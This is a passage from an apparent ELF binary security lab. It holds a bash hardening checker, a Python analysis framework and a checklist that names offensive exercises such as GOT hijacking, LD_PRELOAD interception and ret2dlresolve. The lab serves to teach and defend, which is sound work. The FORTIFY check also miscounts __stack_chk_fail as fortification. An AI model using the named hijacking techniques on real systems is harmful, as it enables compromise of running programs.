echo "============================================"
echo ""

SCORE=0
TOTAL=0

check() {
    local name="$1"
    local result="$2"
    local msg="$3"
    TOTAL=$((TOTAL + 1))
    if [ "$result" = "pass" ]; then
        echo -e "  $PASS $name: $msg"
        SCORE=$((SCORE + 1))
    elif [ "$result" = "warn" ]; then
        echo -e "  $WARN $name: $msg"
    else
        echo -e "  $FAIL $name: $msg"
    fi
}

# 1. PIE (Position Independent Executable)
echo "--- Position Independence ---"
ETYPE=$(readelf -h "$BINARY" 2>/dev/null | grep "Type:" | awk '{print $2}')
if [ "$ETYPE" = "DYN" ]; then
    check "PIE" "pass" "Binary is position-independent (ET_DYN)"
else
    check "PIE" "fail" "Binary is NOT position-independent (ET_EXEC at fixed address)"
fi

# 2. Stack Canary
echo ""
echo "--- Stack Protection ---"
if readelf -s "$BINARY" 2>/dev/null | grep -q "__stack_chk_fail"; then
    check "Stack Canary" "pass" "Stack protector enabled (__stack_chk_fail referenced)"
else
    check "Stack Canary" "fail" "No stack protector detected"
fi

# 3. NX (Non-executable stack)
STACK_FLAGS=$(readelf -l "$BINARY" 2>/dev/null | grep "GNU_STACK" | awk '{print $NF}')
if [ -z "$STACK_FLAGS" ]; then
    check "NX Stack" "warn" "No PT_GNU_STACK segment (kernel default applies)"
elif echo "$STACK_FLAGS" | grep -q "E"; then
    check "NX Stack" "fail" "Stack is EXECUTABLE (PT_GNU_STACK has PF_X)"
else
    check "NX Stack" "pass" "Stack is non-executable"
fi

# 4. RELRO
echo ""
echo "--- RELRO (GOT Protection) ---"
HAS_RELRO=$(readelf -l "$BINARY" 2>/dev/null | grep -c "GNU_RELRO" || true)
HAS_BINDNOW=$(readelf -d "$BINARY" 2>/dev/null | grep -c "BIND_NOW" || true)

if [ "$HAS_RELRO" -gt 0 ] && [ "$HAS_BINDNOW" -gt 0 ]; then
    check "Full RELRO" "pass" "GOT is read-only after startup (full protection)"
elif [ "$HAS_RELRO" -gt 0 ]; then
    check "Partial RELRO" "warn" "Partial RELRO only — .got.plt remains writable"
else
    check "No RELRO" "fail" "No RELRO — entire GOT writable at runtime"
fi

# 5. FORTIFY_SOURCE
echo ""
echo "--- FORTIFY_SOURCE ---"
if readelf -s "$BINARY" 2>/dev/null | grep -q "__.*_chk"; then
    check "FORTIFY" "pass" "Fortified functions detected (buffer overflow checks)"
else
    check "FORTIFY" "warn" "No fortified functions found (compile with -D_FORTIFY_SOURCE=2)"
fi

# 6. RPATH/RUNPATH
echo ""
echo "--- Library Search Path ---"
RPATH=$(readelf -d "$BINARY" 2>/dev/null | grep "RPATH" || true)
RUNPATH=$(readelf -d "$BINARY" 2>/dev/null | grep "RUNPATH" || true)

if [ -n "$RPATH" ]; then
    check "RPATH" "warn" "DT_RPATH set: $RPATH (potential hijack vector)"
elif [ -n "$RUNPATH" ]; then
    check "RUNPATH" "warn" "DT_RUNPATH set: $RUNPATH"
else
    check "Library Path" "pass" "No RPATH/RUNPATH (uses standard search)"
fi

# 7. TEXTREL
HAS_TEXTREL=$(readelf -d "$BINARY" 2>/dev/null | grep -c "TEXTREL" || true)
if [ "$HAS_TEXTREL" -gt 0 ]; then
    check "TEXTREL" "fail" "DT_TEXTREL present — text segment writable during load"
else
    check "No TEXTREL" "pass" "No text relocations"
fi

# 8. W^X segments
echo ""
echo "--- Segment Permissions ---"
WX_SEGS=$(readelf -l "$BINARY" 2>/dev/null | grep "LOAD" | grep "RWE" | wc -l || true)
if [ "$WX_SEGS" -gt 0 ]; then
    check "W^X" "fail" "$WX_SEGS PT_LOAD segments are both Writable AND Executable"
else
    check "W^X" "pass" "No W^X violations in PT_LOAD segments"
fi

# 9. Section headers present
echo ""
echo "--- Analysis Resistance ---"
SHNUM=$(readelf -h "$BINARY" 2>/dev/null | grep "section headers" | awk '{print $NF}')
if [ "$SHNUM" = "0" ]; then
    check "Sections" "warn" "No section headers (analysis-resistant)"
else
    check "Sections" "pass" "Section header table present ($SHNUM sections)"
fi

# Summary
echo ""
echo "============================================"
echo " Score: $SCORE / $TOTAL checks passed"
echo "============================================"

if [ "$SCORE" -eq "$TOTAL" ]; then
    echo -e " ${GREEN}All hardening checks passed!${NC}"
elif [ "$SCORE" -ge $((TOTAL * 7 / 10)) ]; then
    echo -e " ${YELLOW}Most checks passed — review warnings above${NC}"
else
    echo -e " ${RED}Significant hardening gaps detected!${NC}"
fi

# Recommended compiler flags
echo ""
echo "--- Recommended Compilation Flags ---"
echo "  gcc -pie -fPIE                   # Position-independent"
echo "  gcc -fstack-protector-strong     # Stack canary"
echo "  gcc -D_FORTIFY_SOURCE=2          # Buffer overflow checks"
echo "  gcc -Wl,-z,relro,-z,now          # Full RELRO"
echo "  gcc -Wl,-z,noexecstack           # NX stack"
echo "  gcc -fcf-protection              # Control-flow integrity"
echo ""
echo "  Combined:"
echo "  gcc -pie -fPIE -fstack-protector-strong -D_FORTIFY_SOURCE=2 \\"
echo "      -Wl,-z,relro,-z,now -Wl,-z,noexecstack -fcf-protection"
```

```bash
chmod +x hardening_check.sh

# Test against various binaries
./hardening_check.sh samples/hello_pie
./hardening_check.sh samples/hello_nopie
./hardening_check.sh samples/hello_static
./hardening_check.sh /usr/bin/ssh   # Should be well-hardened
```

---

## PART C: FRAMEWORK DEVELOPMENT

### Project: ELF Security Analysis Framework (ELFSAF)

**Objective:** Build a modular Python framework that combines the offensive analysis (parser), defensive detection (anomaly engine), and operational tooling (hardening checker) into a single reusable package.

```python
#!/usr/bin/env python3
"""
elfsaf/ — ELF Security Analysis Framework
A modular toolkit for ELF binary security analysis.

Structure:
    elfsaf/
    ├── __init__.py
    ├── parser.py       — Low-level ELF parser
    ├── anomaly.py      — Anomaly detection engine
    ├── hardening.py    — Hardening verification
    ├── yara_gen.py     — YARA rule generation
    └── report.py       — Reporting/output

Usage:
    from elfsaf import ELFSecurityAnalyzer
    analyzer = ELFSecurityAnalyzer("./binary")
    report = analyzer.full_analysis()
    report.print_summary()
"""

# === elfsaf/__init__.py ===
# (Framework entry point — combines all modules)

import struct
import os
import json
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple
from enum import IntEnum

# --- Core Types ---

class Severity(IntEnum):
    INFO = 0
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4

class MitigationStatus(IntEnum):
    ABSENT = 0
    PARTIAL = 1
    FULL = 2

@dataclass
class Finding:
    severity: Severity
    category: str
    title: str
    description: str
    remediation: str = ""
    mitre_id: str = ""
    offset: int = 0

@dataclass
class MitigationReport:
    pie: MitigationStatus = MitigationStatus.ABSENT
    relro: MitigationStatus = MitigationStatus.ABSENT
    nx_stack: MitigationStatus = MitigationStatus.ABSENT
    stack_canary: MitigationStatus = MitigationStatus.ABSENT
    fortify: MitigationStatus = MitigationStatus.ABSENT
    cfi: MitigationStatus = MitigationStatus.ABSENT
    
    @property
    def score(self) -> float:
        total = 6 * 2  # 6 checks, max score 2 each
        actual = sum([self.pie, self.relro, self.nx_stack, 
                     self.stack_canary, self.fortify, self.cfi])
        return actual / total * 100

@dataclass
class AnalysisReport:
    path: str
    size: int
    findings: List[Finding] = field(default_factory=list)
    mitigations: MitigationReport = field(default_factory=MitigationReport)
    metadata: Dict = field(default_factory=dict)
    
    @property
    def max_severity(self) -> Severity:
        return max((f.severity for f in self.findings), default=Severity.INFO)
    
    def to_json(self) -> str:
        return json.dumps(asdict(self), indent=2, default=str)
    
    def print_summary(self):
        print(f"\n{'='*60}")
        print(f"  ELF Security Analysis: {self.path}")
        print(f"  Size: {self.size:,} bytes")
        print(f"  Mitigation Score: {self.mitigations.score:.0f}%")
        print(f"  Findings: {len(self.findings)} "
              f"(max severity: {self.max_severity.name})")
        print(f"{'='*60}")
        
        if self.findings:
            print("\n  Findings (highest severity first):")
            for f in sorted(self.findings, key=lambda x: x.severity, reverse=True):
                sev = f.severity.name
                print(f"    [{sev:8s}] {f.title}")
                if f.description:
                    print(f"              {f.description}")
                if f.remediation:
                    print(f"              Fix: {f.remediation}")
        
        print(f"\n  Mitigations:")
        m = self.mitigations
        status_str = {0: "ABSENT", 1: "PARTIAL", 2: "FULL"}
        print(f"    PIE:          {status_str[m.pie]}")
        print(f"    RELRO:        {status_str[m.relro]}")
        print(f"    NX Stack:     {status_str[m.nx_stack]}")
        print(f"    Stack Canary: {status_str[m.stack_canary]}")
        print(f"    FORTIFY:      {status_str[m.fortify]}")
        print(f"    CFI:          {status_str[m.cfi]}")
        print(f"\n    Overall Score: {m.score:.0f}%")


class ELFSecurityAnalyzer:
    """Main analysis orchestrator."""
    
    def __init__(self, path: str):
        self.path = path
        with open(path, 'rb') as f:
            self.data = f.read()
        self.report = AnalysisReport(
            path=path,
            size=len(self.data)
        )
    
    def full_analysis(self) -> AnalysisReport:
        """Run all analysis passes."""
        self._parse_header()
        self._check_mitigations()
        self._detect_anomalies()
        return self.report
    
    def _parse_header(self):
        if self.data[:4] != b'\x7fELF':
            self.report.findings.append(Finding(
                Severity.CRITICAL, "format", "Not an ELF file",
                "File does not begin with ELF magic bytes"))
            return
        
        is_64 = self.data[4] == 2
        self.report.metadata['class'] = 64 if is_64 else 32
        self.report.metadata['endian'] = 'little' if self.data[5] == 1 else 'big'
        
        fmt = '<' if self.data[5] == 1 else '>'
        
        if is_64:
            e_type = struct.unpack_from(f'{fmt}H', self.data, 16)[0]
            e_machine = struct.unpack_from(f'{fmt}H', self.data, 18)[0]
            e_entry = struct.unpack_from(f'{fmt}Q', self.data, 24)[0]
        else:
            e_type = struct.unpack_from(f'{fmt}H', self.data, 16)[0]
            e_machine = struct.unpack_from(f'{fmt}H', self.data, 18)[0]
            e_entry = struct.unpack_from(f'{fmt}I', self.data, 24)[0]
        
        type_map = {0: 'NONE', 1: 'REL', 2: 'EXEC', 3: 'DYN', 4: 'CORE'}
        self.report.metadata['type'] = type_map.get(e_type, f'UNKNOWN({e_type})')
        self.report.metadata['machine'] = e_machine
        self.report.metadata['entry'] = f'0x{e_entry:x}'
    
    def _check_mitigations(self):
        """Check all binary hardening mitigations."""
        # Implementation uses the same logic as the shell script above
        # but in Python for integration
        try:
            import lief
            binary = lief.parse(self.path)
            if binary is None:
                return
            
            # PIE
            if binary.is_pie:
                self.report.mitigations.pie = MitigationStatus.FULL
            
            # RELRO
            if binary.has(lief.ELF.DYNAMIC_TAGS.BIND_NOW):
                self.report.mitigations.relro = MitigationStatus.FULL
            elif any(s.type == lief.ELF.SEGMENT_TYPES.GNU_RELRO 
                    for s in binary.segments):
                self.report.mitigations.relro = MitigationStatus.PARTIAL
            
            # NX Stack
            for seg in binary.segments:
                if seg.type == lief.ELF.SEGMENT_TYPES.GNU_STACK:
                    if not (seg.flags & lief.ELF.SEGMENT_FLAGS.X):
                        self.report.mitigations.nx_stack = MitigationStatus.FULL
                    break
            
            # Stack Canary
            if any('__stack_chk' in sym.name for sym in binary.symbols 
                   if sym.name):
                self.report.mitigations.stack_canary = MitigationStatus.FULL
            
            # FORTIFY
            if any('_chk' in sym.name for sym in binary.symbols if sym.name):
                self.report.mitigations.fortify = MitigationStatus.FULL
            
        except ImportError:
            # Fallback without lief — use readelf parsing
            pass
    
    def _detect_anomalies(self):
        """Run the anomaly detection engine."""
        # Integrate the ELFAnomalyDetector from Exercise B1
        from elf_anomaly_detector import ELFAnomalyDetector
        detector = ELFAnomalyDetector(self.data)
        analysis = detector.analyze(self.path)
        
        for finding in analysis.findings:
            self.report.findings.append(Finding(
                severity=Severity(finding.severity),
                category=finding.category,
                title=finding.description,
                description=finding.details
            ))


# === CLI Entry Point ===
if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 -m elfsaf <binary> [--json]")
        sys.exit(1)
    
    analyzer = ELFSecurityAnalyzer(sys.argv[1])
    report = analyzer.full_analysis()
    
    if '--json' in sys.argv:
        print(report.to_json())
    else:
        report.print_summary()
```

### Deployment Guide

```bash
# Package structure
mkdir -p ~/elf-lab/elfsaf
# Save the above as ~/elf-lab/elfsaf/__init__.py
# Copy elf_anomaly_detector.py to ~/elf-lab/elfsaf/

# Test
cd ~/elf-lab
python3 -m elfsaf samples/hello_pie
python3 -m elfsaf samples/hello_nopie
python3 -m elfsaf samples/minimal_elf --json
```

---

## Lab Validation Checklist

After completing all exercises, verify:

- [ ] **A1:** Created binary with fake sections that still executes
- [ ] **A2:** Successfully hijacked GOT to redirect `puts()` to custom function
- [ ] **A3:** Built and ran a minimal ELF (<200 bytes) with no libc
- [ ] **A4:** Demonstrated `LD_PRELOAD` interception and `AT_SECURE` protection
- [ ] **A5:** Understood ret2dlresolve structure (even if full exploit requires tweaking per-binary)
- [ ] **B1:** Anomaly detector correctly flags manipulated binaries
- [ ] **B2:** YARA rules match expected samples without false positives on `/usr/bin/`
- [ ] **B3:** GOT monitor detects runtime GOT modifications
- [ ] **B4:** Hardening checker correctly identifies mitigation presence/absence
- [ ] **C:** Framework combines all components and produces structured output

## References

- System V Application Binary Interface (gABI): https://www.sco.com/developers/gabi/
- x86-64 psABI supplement: https://gitlab.com/x86-psABIs/x86-64-ABI
- glibc dynamic linker source: `elf/rtld.c`, `elf/dl-runtime.c`, `sysdeps/x86_64/dl-trampoline.S`
- Linux kernel `fs/binfmt_elf.c`
- MITRE ATT&CK: T1027 (Obfuscated Files), T1055 (Process Injection), T1574.006 (Dynamic Linker Hijacking)
